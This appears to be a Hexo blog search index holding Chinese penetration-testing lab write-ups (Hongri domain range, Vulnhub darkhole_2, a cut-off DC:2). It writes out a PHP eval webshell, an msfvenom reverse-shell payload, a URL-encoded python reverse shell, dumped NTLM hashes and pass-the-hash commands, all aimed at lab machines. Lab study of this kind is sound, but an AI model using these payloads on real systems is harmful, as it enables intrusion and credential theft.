<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日靶场-1</title>
      <link href="/post/8011e4fc.html"/>
      <url>/post/8011e4fc.html</url>
      
        <content type="html"><![CDATA[<p>红日靶场涉及内网知识，和前期靶场不太一样，前期靶场大部分都是单个靶机获得<code>root</code>权限，而这一次更综合，后期也会继续学习内网知识，继续打红日靶场，提高自己的综合技能。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先本题的网络拓扑结构如下所示，三台虚拟机的初始密码都是<code>hongrisec@2019</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/3074366-20230309202513912-2072192058.png" alt="img"></p><p>这里我们的Web服务器是win7虚拟机，其他两台虚拟机是域内成员，一台作为我们的DC，首先介绍一下什么是工作组和域。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">将不同计算机按功能分别列入不同的组内，在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</span><br><span class="line">域：</span><br><span class="line">域是一个有安全边界的计算机集合（安全边界的意思即一个域中的用户无法访问另外一个域中的资源），相比工作组而言，它有一个更加严格的安全管理机制，如果想访问域内资源，必须拥有一个合法的身份登录到该域中，你的权限取决于你在该域中的用户身份。</span><br><span class="line">DC：</span><br><span class="line">域内管理者，活动目录的数据库（包括用户的账号信息）是存储在DC中的，一旦DC瘫痪，其他用户就不能登录该域，内网中最重要的也是拿到域内DC控制权</span><br></pre></td></tr></table></figure><p>这里我们设置网络VMnet1和VMnet8，将VMnet1作为内网，VMnet8作为外网，其中需要注意的是，VMnet1的子网地址必须是<code>192.168.52.0</code>，否则后面win7的web服务无法开启</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103134521469.png" alt="image-20241103134521469"></p><h2 id="配置win7-web服务网络"><a href="#配置win7-web服务网络" class="headerlink" title="配置win7 web服务网络"></a>配置win7 web服务网络</h2><p>从网络拓扑图可知，需要模拟内网和外网两个网段，Win7虚拟机相当于网关服务器，所以需要两张网卡，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103134847041.png" alt="image-20241103134847041"></p><p>我们试着ping一下我们的主机，如果可以ping通，说明我们成功连接上了外网，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103135050080.png" alt="image-20241103135050080"></p><p>同时记得把虚拟机的防火墙关闭，否则我们的攻击机ping不通我们的win7虚拟机</p><p>ping一下DC域控，能ping通说明内网设置也成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103140146545.png" alt="image-20241103140146545"></p><h2 id="配置Winserver-2008（DC）"><a href="#配置Winserver-2008（DC）" class="headerlink" title="配置Winserver 2008（DC）"></a>配置Winserver 2008（DC）</h2><p>我们直接将域控主机配置VMnet1网卡，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103135703528.png" alt="image-20241103135703528"></p><h2 id="配置win2k3网络-域成员"><a href="#配置win2k3网络-域成员" class="headerlink" title="配置win2k3网络(域成员)"></a>配置win2k3网络(域成员)</h2><p>域内主机win2003的网卡配置和DC配置一致，选择VMnet1网卡即可，与外网不连通</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103140036762.png" alt="image-20241103140036762"></p><p>ip配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows11攻击机：192.168.20.130</span><br><span class="line">Windows7（web服务器）：192.168.20.132、192.168.52.143</span><br><span class="line">Windows2008（DC）：192.168.52.138</span><br><span class="line">Win2k3：192.168.52.141</span><br></pre></td></tr></table></figure><p>接着我们开启win7上的web服务，我们打开phpstudy，启动服务</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103141204446.png" alt="image-20241103141204446"></p><p>我们试着访问一下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103141313538.png" alt="image-20241103141313538"></p><p>可以正常访问到PHP探针，至此环境全部搭建完毕，接下来我们可以愉快的进行渗透拿权限了。</p><h1 id="外网边界探测"><a href="#外网边界探测" class="headerlink" title="外网边界探测"></a>外网边界探测</h1><p>我们首先探测一下外网主机开放的端口，我们使用nmap进行扫描，如下所示，<code>nmap -T4 -sV -p- -A 192.168.20.132</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103154814975.png" alt="image-20241103154814975"></p><p>我们发现开放了<code>80</code>、<code>3306</code>、<code>445</code>以及<code>139</code>端口，这就提醒我们可以从3个方向入手，分别是web网页、mysql数据库以及SMB服务，我们首先试试SMB服务，看看有没有信息泄露，我们使用smbclient进行查看，但是并没有什么有价值的信息，我们还是从80端口出发，先扫一扫有没有后门目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 dirsearch.py -u http://192.168.20.132/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103161614214.png" alt="image-20241103161614214"></p><p>我们发现存在phpmyadmin后台，即著名的mysql数据库管理后台，我们尝试访问一下，我们先尝试一下弱密码<code>root:root</code>，发现成功登陆进去了，我们先尝试看看有没有nday漏洞给我们利用，先看版本号</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103162318935.png" alt="image-20241103162318935"></p><p>版本号为<code>5.5.53</code>，我们尝试去搜索该版本的历史漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103162846922.png" alt="image-20241103162846922"></p><p>并没有历史漏洞，所以我们得换一种思路去getshell，我们通过搜寻，可以知道phpmyadmin可以利用mysql日志文件写入shell进行getshell，我们尝试一下这种做法，以前还从来没这么做过</p><h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>首先我们开启mysql日志，在运行框中运行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103163916413.png" alt="image-20241103163916413"></p><p>查看当前mysql路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/6af5c5a34243ce5ab3df5bdad58598b5.png" alt="6af5c5a34243ce5ab3df5bdad58598b5"></p><p>接下来设置木马写入的路径，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file =&quot;C:/phpStudy/WWW/shell.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103164440445.png" alt="image-20241103164440445"></p><p>接下来我们写入一句话木马，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;attack&#x27;])?&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103164922719.png" alt="image-20241103164922719"></p><p>接下来我们直接访问shell.php即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103165056709.png" alt="image-20241103165056709"></p><p>我们尝试蚁剑连接，获取虚拟终端，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103170002989.png" alt="image-20241103170002989"></p><p>我们执行ipconfig，发现了内网网段192.168.52.0/24</p><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p>首先先把主机防火墙关闭，方便我们进行进一步操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103171605188.png" alt="image-20241103171605188"></p><p>接下来我们运行msf，使用msf上线主机，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.20.138  LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>我们将shell.exe通过蚁剑上传到靶机上去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103172925586.png" alt="image-20241103172925586"></p><p>接着我们在kali上开启监听模式，持续监听连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br></pre></td></tr></table></figure><p>我们用蚁剑运行exe文件，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103174345423.png" alt="image-20241103174345423"></p><p>我们的kali成功上线windows7，第一步我们进行权限维持</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>进行权限维持就是要将进程进行迁移，即将我们的shell.exe的进程附加在系统进程上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">migrate 1944</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103175323881.png" alt="image-20241103175323881"></p><h2 id="收集域内信息"><a href="#收集域内信息" class="headerlink" title="收集域内信息"></a>收集域内信息</h2><p>内网信息收集的主要目的就是查找域控以及域控内的其他主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure><p>首先判断是否存在域，我们使用<code>ipconfig /all</code>查看DNS服务器，我们发现存在域<code>god.org</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103184701843.png" alt="image-20241103184701843"></p><p>接着我们使用<code>net view /domain</code>查看有几个域</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103184916130.png" alt="image-20241103184916130"></p><p>我们发现只有唯一一个域，接下来我们查看域控主机名，我们使用<code>net group &quot;doamin controllers&quot; /domain</code>进行查询即可，我们可以查询到域控为<code>owa</code></p><p>我们接着查询所有域内主机，如下所示<code>net view</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103190141105.png" alt="image-20241103190141105"></p><p>接着我们查询域内IP，使用<code>arp -a</code>进行查询</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/06ac1b56a8e56435c3efedb8112348ed.png" alt="06ac1b56a8e56435c3efedb8112348ed"></p><p>为了确定哪个是域控主机IP，我们尝试去ping一下域名<code>ping owa.god.org</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103190353925.png" alt="image-20241103190353925"></p><p>至此我们域内信息收集完毕</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名为 god</span><br><span class="line">域中有三台主机：</span><br><span class="line">stu1.god.org   </span><br><span class="line">root-tvi862ubeh.god.org   192.168.52.141</span><br><span class="line">owa.god.org   192.168.52.138 域控主机</span><br></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>首先我们要配置代理，使用proxychains进行代理配置，否则我们的kali机无法扫描到内网的机器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">设置proxychains代理</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvport 1080</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>之后我们在我们的配置文件<code>/etc/proxychains4.conf</code>加上代理，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103194239719.png" alt="image-20241103194239719"></p><p>我们直接挂代理扫域控主机的端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.138</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/Snipaste_2021-07-20_22-00-39.png" alt="Snipaste_2021-07-20_22-00-39"></p><p>我们发现开放了445端口，我们尝试使用永恒之蓝进行探测，但是没有成功，后来上网查询发现哈希传递可以拿下域控，利用永恒之蓝拿shell成功案例太少了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103205751996.png" alt="image-20241103205751996"></p><h2 id="哈希传递攻击拿下域控"><a href="#哈希传递攻击拿下域控" class="headerlink" title="哈希传递攻击拿下域控"></a>哈希传递攻击拿下域控</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希传递攻击：</span><br><span class="line">在 kerberos、NTLM 认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击（Pass The Hash，简称 PTH）。如果内网主机的本地管理员账户密码相同，那么可以通过 PTH 远程登录到任意一台主机。</span><br><span class="line">攻击流程：</span><br><span class="line">1. 获得一台域控主机的权限，Dump内存获得该主机获得该主机的用户密码Hash值；</span><br><span class="line">2. 通过哈希传递攻击尝试登录其他主机</span><br><span class="line">3. 继续收集哈希并尝试远程登录，知道获得域管理员Hash，登录域控，控制整个域</span><br></pre></td></tr></table></figure><p>首先我们使用hashdump获取哈希值，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103220640788.png" alt="image-20241103220640788"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>但是这知识用户密码的一个hash值，我们在msf里加载mimikatz模块，之后使用<code>credebtials</code>获取哈希值和密码，但是要注意的是，这里得首先进行进程迁移，因为kiwi模块不能在x64上运行，我们迁移到x86进程即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241103222448140.png" alt="image-20241103222448140"></p><p>所以哈希值为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">38131169c2d3664b0e8cc78be9175e3c</span><br></pre></td></tr></table></figure><p>我们使用以下模块进行哈希传递</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command   #在目标机器上执行系统命令</span><br><span class="line">exploit/windows/smb/psexec           #用psexec执行系统命令</span><br><span class="line">exploit/windows/smb/psexec_psh       #使用powershell作为payload</span><br></pre></td></tr></table></figure><p>以exploit/windows/smb/psexec模块进行哈希传递攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:38131169c2d3664b0e8cc78be9175e3c</span><br><span class="line">set smbdomain god</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-darkhole_2</title>
      <link href="/post/c744004c.html"/>
      <url>/post/c744004c.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/darkhole/darkhole_2.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>难度：困难</p><p>提示信息：Don’t waste your time For Brute-Force</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.154</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026141654340.png" alt="image-20241026141654340"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.154</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026142001602.png" alt="image-20241026142001602"></p><p>开放了<code>80</code>端口和<code>22</code>端口，我们还是老样子先对<code>80</code>端口进行信息收集</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026142255549.png" alt="image-20241026142255549"></p><p>我们在使用nmap的时候，帮我们探测出来了该网站存在<code>git</code>泄露，我们使用<code>githacker</code>获取网站源码，如下图所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githacker --url http://192.168.20.154/.git/ --output-folder darkhole</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026143205898.png" alt="image-20241026143205898"></p><p>我们成功获取部分源码，当我们在查看<code>login.php</code>的时候，发现了很明显的sql注入的漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5d9fdcaed63e388e8f25dab9fbce9269.png" alt="5d9fdcaed63e388e8f25dab9fbce9269"></p><p>这摆明了就是要靠sql注入的节奏</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026144549097.png" alt="image-20241026144549097"></p><p>但是这里直接给我禁止了，说明还是不可以进行sql注入的，因为会限制输入的符号，我们用sqlmap跑的结果也是，显示可能存在waf，所以我们还是得从别的地方找切入口</p><p>我们尝试从提交日志去寻找关键信息，我们一条一条日志去分析，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026145842200.png" alt="image-20241026145842200"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026150018464.png" alt="image-20241026150018464"></p><p>成功发现登录的账号密码，我们直接登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lush@admin.com/321</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026183834429.png" alt="image-20241026183834429"></p><p>我们发现后面的<code>id=1</code>可能存在sql注入，我们先尝试手注测试一下，当我们输入<code>id=1&#39;</code>时页面不正常，但是当我们输入<code>id=1&#39; --+</code>的时候，页面显示正常，说明存在sql注入，我们尝试用sqlmap去跑，看是否能跑出来</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026184714394.png" alt="image-20241026184714394"></p><p>我们这里跑出来他的数据库是mysql，说明存在sql注入，接下来我们一步步脱裤数据即可</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>首先执行<code>python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; --dbs --batch</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026184830497.png" alt="image-20241026184830497"></p><p>我们可以发现存在以上几个数据库，我们先查询<code>darkhole_2</code>的表，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185040180.png" alt="image-20241026185040180"></p><p>我们直接查<code>ssh</code>表中的列数据，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 -T ssh --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185215576.png" alt="image-20241026185215576"></p><p>接下来就直接查看密码即可，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python39 sqlmap.py -r &quot;C:\Users\Administrator\Desktop\sql.txt&quot; -D darkhole_2 -T ssh --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185458130.png" alt="image-20241026185458130"></p><p>成功获取一个ssh用户的账号密码，我们直接ssh登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jehad/fool</span><br></pre></td></tr></table></figure><h2 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026185643791.png" alt="image-20241026185643791"></p><p>成功登录上去，我们寻找第一个flag，我们在losy用户下发现了<code>user.txt</code>，读取，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DarkHole&#123;&#x27;This_is_the_life_man_better_than_a_cruise&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026190139540.png" alt="image-20241026190139540"></p><p>接下来我们要进行的就是进行提权了，我们要提升到root权限才能方便我们继续我们下一步的操作</p><h2 id="权限横向移动"><a href="#权限横向移动" class="headerlink" title="权限横向移动"></a>权限横向移动</h2><p>我们检查了<code>jeahd</code>用户下的sudo提权和suid提权，都不存在可以利用的点，而<code>user.txt</code>是在<code>losy</code>用户下发现的，所以我们需要切换到<code>losy</code>用户下，我们接着寻找有没有可以利用的点</p><p>在我们上传的提权脚本中，我们发现靶机还开放了一个<code>9999</code>端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026192605583.png" alt="image-20241026192605583"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c64490d09eec643cd56ffbc95c39ff51.png" alt="c64490d09eec643cd56ffbc95c39ff51"></p><p>我们尝试用web去访问这个9999端口，但是访问不到</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026193150781.png" alt="image-20241026193150781"></p><p>我们尝试去访问这个web服务的源码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026193942830.png" alt="image-20241026193942830"></p><p>是一个cmd执行任意命令的脚本，我们现在只要能够访问到这个web服务，我们就可以将losy的权限反弹shell到我们本地来，我们首先进行本地端口转发，不然一直访问不到web页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026194550831.png" alt="image-20241026194550831"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 9999:localhost:9999 jehad@192.168.20.154</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026194707380.png" alt="image-20241026194707380"></p><p>接下来我们就可以访问到web服务了，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026195106815.png" alt="image-20241026195106815"></p><p>接下来我们直接反弹shell即可，记得将反弹shell语句进行url编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &quot;http://127.0.0.1:9999/?cmd=export+RHOST%3d%22192.168.20.138%22%3bexport+RPORT%3d9001%3bpython3+-c+%27import+sys%2csocket%2cos%2cpty%3bs%3dsocket.socket()%3bs.connect((os.getenv(%22RHOST%22)%2cint(os.getenv(%22RPORT%22))))%3b%5bos.dup2(s.fileno()%2cfd)+for+fd+in+(0%2c1%2c2)%5d%3bpty.spawn(%22%2fbin%2fbash%22)%27&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026195718604.png" alt="image-20241026195718604"></p><p>成功获得losy权限</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们尝试<code>sudo -l</code>的时候，发现需要用户密码，但是我们没有用户密码，我们输入<code>history</code>命令后，发现泄露了用户密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200234653.png" alt="image-20241026200234653"></p><p>我们继续使用<code>sudo -l</code>提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200313115.png" alt="image-20241026200313115"></p><p>我们发现python3可以用来进行sudo提权，我们执行以下语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200549909.png" alt="image-20241026200549909"></p><p>成功获取root权限，我们直接寻找最后一个flag即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DarkHole&#123;&#x27;Legend&#x27;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241026200649045.png" alt="image-20241026200649045"></p><p>本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题难度比较大，考的点也比较多，在vulnhub上也别认定为为hard难度，首先就是git泄露，但是git泄露不要被他的源码给骗了，最重要的还是去查看git日志，里面隐藏了关键信息，然后进入网站后也要有发现sql注入的敏感性，通过sql注入脱裤找到ssh登录的账号密码，然后权限横向移动，通过端口转发实现反弹shell，这也是我第一次遇见端口转发的题目，最后再进行sudo提权，总体来讲思路很清晰，但是有些信息不是那么好找，还是得细心吧，就像我一样错过了<code>9999</code>的异常端口，导致耗了很久。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-DC:2</title>
      <link href="/post/ca55a63c.html"/>
      <url>/post/ca55a63c.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/dc/DC-2.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>靶机：192.168.20.0/24</p><p>目标：获取5个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.153</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025205134720.png" alt="image-20241025205134720"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.153</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025205510857.png" alt="image-20241025205510857"></p><p>开放了<code>80</code>端口和<code>7744</code>端口，其中<code>7744</code>端口对应的是ssh服务，我们首先访问80端口http服务</p><p>我们成功发现第一个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025210410298.png" alt="image-20241025210410298"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure><p>这条提示信息告诉我们常用的密码字典可能不起作用，可能需要我们用<code>cewl</code>自动生成字典，同时我们要尝试登录进去，首先我们需要找到登录框在哪，我们先用dirsearch扫一下后门目录</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241025211457242.png" alt="image-20241025211457242"></p><p>我们发现是wordpress框架，我们尝试访问后台登录网站，发现存在，我们尝试用wpscan进行网站探针</p><p><img 